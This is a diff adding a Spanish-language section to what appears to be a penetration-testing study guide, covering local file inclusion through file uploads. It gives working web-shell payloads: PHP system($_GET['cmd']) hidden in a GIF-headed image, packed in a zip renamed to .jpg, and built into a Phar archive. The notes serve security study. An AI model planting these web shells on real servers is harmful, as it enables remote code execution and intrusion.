@@ -391,6 +391,75 @@ impacket-smbserver -smb2support share $(pwd)
 ```
 ![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/944831aa-be32-4670-bd48-e9bdfed92638)
 
+## LFI Y SUBIDA DE ARCHIVOS
+
+Las funcionalidades de subir archivos son obicuos en los sistemas modernos, los usuarios normalmente necesitan configuracion e los perfiles y usar la aplicacion para subir archivos. Los atacantes puede aaprovecha esto y sacar vulnerabilidades.
+
+El ataque de subida de archivos coge diferentes tecnicas de subida y funcionalidaes. Sin embargo el ataque lo veremos ahora, requiere que se suba una rchivo en un form vulnerable, y grcias a ello con una ejecución de codigo cambien la funcion y capacidades, el codigo se sube y se ejcuta, Por ejemplo subes un "image.jpg" y guarad un pequeño códig PHP y incluye la vulnerabilidad LFI
+
+![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/572635d7-39b6-4962-b407-da69edb1f716)
+
+## SUBIDAD DE IMAGEN
+
+La subida de imagen es muy común en todas las aplicaciones modernas, subir imagenes seguras y la funcion de codificarlas. Sin embargo la vulnerabilidad en este caso si que nos funciona
+
+### CONSTRUIR UNA IMAGEN MALICIOSA
+
+Nuestro primer paso sera crear una imagen maliciosa que contenga codigo PHP con una web shell y funcione como imagen. Nosotros usamos extensiones de la imagen como "shell.gif" y incluye unos pequeños bytes de magia 
+
+```
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+```
 
 
+El archivo es nuestro y completamente inofensivo o eso parece.
+
+Solamente necsitamos subirlo por ejemplo en un "profile settings" y cambialo por nuestra imagen. 
+
+![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/7a50aa87-a1e7-4ba2-b1e3-9e2413118c0d)
+
+## ROTA DE SUBIDA DE LA IMAGEn
+
+Una cosa importante es saber donde se sube el fichero, Para incluido necesitamos subir un fichero, especialmente con imagenes, podemos acceder nuestro subida y saber donde ha llegado
+```
+<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
+```
+
+Cuando pulsamos la ruta e incluimos la desacga el codigo se deberia ejecutar
+
+![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/3ae9e40e-cf24-4d5c-903a-5ad0d97da7e6)
+
+## SUBIDA ZIP
+
+Anteriormente mencionado, hay bastantes tecnicas en muchos casos utilizamos frameworks, una seccion vulnerable para ejecución de código remoto. Hay otras técnicas PHP que utilizan wrappers para archivar. Estas técnicas se hacer para especificar casos donde otras técnicas no funcionan.
+
+Podemos utilizar el envoltorio zip para jecutar código como "shell.jpg"
+
+```
+echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+```
+
+Una vez subido "shell.jpg" podemos incluid el wrapper zip://shell.jpg y otras referencias de fichero con #shell.hp codificoad
+
+![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/7e619891-7caf-4204-af50-d09dde43b90f)
+
+## SUBIDA PHAR
+
+Finalmente podemos usar "phar://
+```
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+$phar->stopBuffering();
+```
+Este escript es como si fuera un fichero "phat" y se hace una shell con un txt
+
+```
+php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+```
+
+Ahora noostros deberiamos llamar al jpg y activaria el subfichero
 
